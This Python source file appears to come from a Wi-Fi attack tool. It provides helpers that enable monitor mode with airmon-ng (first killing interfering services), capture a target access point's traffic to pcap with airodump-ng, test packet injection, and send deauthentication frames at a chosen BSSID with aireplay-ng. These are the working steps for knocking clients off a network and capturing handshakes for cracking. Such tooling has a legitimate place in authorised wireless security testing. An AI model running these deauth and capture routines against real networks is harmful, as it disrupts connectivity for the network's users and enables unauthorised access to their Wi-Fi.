"""Monitor-mode and airodump/aireplay helpers."""

from __future__ import annotations

import re
import subprocess
from pathlib import Path
from typing import Optional

from modules.constants import DEAUTH_COUNT
from modules.network import wireless_interfaces
from modules.tools import run_cmd, which_or_none


def safe_filename(ssid: str) -> str:
    cleaned = "".join(c if c.isalnum() or c in "-_." else "_" for c in ssid).strip("._")
    return (cleaned[:40] or "target")


def iface_type(name: str) -> str:
    iw = which_or_none("iw")
    if not iw:
        return ""
    code, out = run_cmd([iw, "dev", name, "info"], timeout=10)
    if code != 0:
        return ""
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("type "):
            return stripped.split(None, 1)[1]
    return ""


def list_monitor_ifaces() -> list[str]:
    return [name for name in wireless_interfaces() if iface_type(name) == "monitor"]


def enable_monitor(iface: str, channel: str) -> tuple[Optional[str], str]:
    if iface_type(iface) == "monitor":
        return iface, f"{iface} is already in monitor mode"

    airmon = which_or_none("airmon-ng")
    if not airmon:
        return None, "airmon-ng was not found on PATH"

    before = set(wireless_interfaces())
    run_cmd([airmon, "check", "kill"], timeout=90)

    start_cmd = [airmon, "start", iface]
    if channel.isdigit():
        start_cmd.append(channel)
    code, out = run_cmd(start_cmd, timeout=60)
    if code != 0:
        return None, out or f"airmon-ng start {iface} failed"

    after = set(wireless_interfaces())
    created = sorted(after - before)
    monitors = list_monitor_ifaces()

    match = re.search(r"\b(\w+mon)\b", out)
    candidates: list[str] = []
    if match:
        candidates.append(match.group(1))
    candidates.extend(created)
    candidates.extend(monitors)
    candidates.append(iface)
    for candidate in candidates:
        if candidate and iface_type(candidate) == "monitor":
            return candidate, out

    if monitors:
        return monitors[0], out
    if created:
        return created[0], out
    return None, out or (
        "Could not enable monitor mode. "
        "This adapter (often Realtek) may lack monitor/injection support."
    )


def stop_monitor(mon: Optional[str], _base_iface: str) -> None:
    airmon = which_or_none("airmon-ng")
    if airmon and mon:
        run_cmd([airmon, "stop", mon], timeout=40)
    systemctl = which_or_none("systemctl")
    if systemctl:
        run_cmd([systemctl, "restart", "NetworkManager"], timeout=40)


def start_airodump(
    mon: str, bssid: str, channel: str, prefix: Path
) -> tuple[Optional[subprocess.Popen], Optional[str]]:
    airodump = which_or_none("airodump-ng")
    if not airodump:
        return None, "airodump-ng was not found on PATH"
    log_path = prefix.with_suffix(".airodump.log")
    log_fh = log_path.open("w", encoding="utf-8")
    cmd = [
        airodump,
        "--bssid",
        bssid,
        "-c",
        channel,
        "-w",
        str(prefix),
        "--output-format",
        "pcap",
        mon,
    ]
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
        )
    except OSError as exc:
        log_fh.close()
        return None, str(exc)
    proc._figo_log = log_fh  # type: ignore[attr-defined]
    return proc, None


def stop_airodump(proc: Optional[subprocess.Popen]) -> None:
    if proc is None:
        return
    log_fh = getattr(proc, "_figo_log", None)
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
    if log_fh:
        try:
            log_fh.close()
        except OSError:
            pass


def run_deauth(mon: str, bssid: str, count: int = DEAUTH_COUNT) -> tuple[int, str]:
    aireplay = which_or_none("aireplay-ng")
    if not aireplay:
        return 127, "aireplay-ng was not found on PATH"
    return run_cmd(
        [aireplay, "--deauth", str(count), "-a", bssid, "-D", mon],
        timeout=30,
    )


def test_injection(mon: str) -> tuple[bool, str]:
    aireplay = which_or_none("aireplay-ng")
    if not aireplay:
        return False, "aireplay-ng was not found on PATH"
    code, out = run_cmd([aireplay, "-9", "-D", mon], timeout=25)
    low = out.lower()
    if "injection is working" in low:
        return True, out
    if "injection is not working" in low:
        return False, out or "Injection is not working on this adapter"
    if code == 0 and "inject" in low:
        return True, out
    return False, out or "Injection test failed (adapter may lack packet injection)"

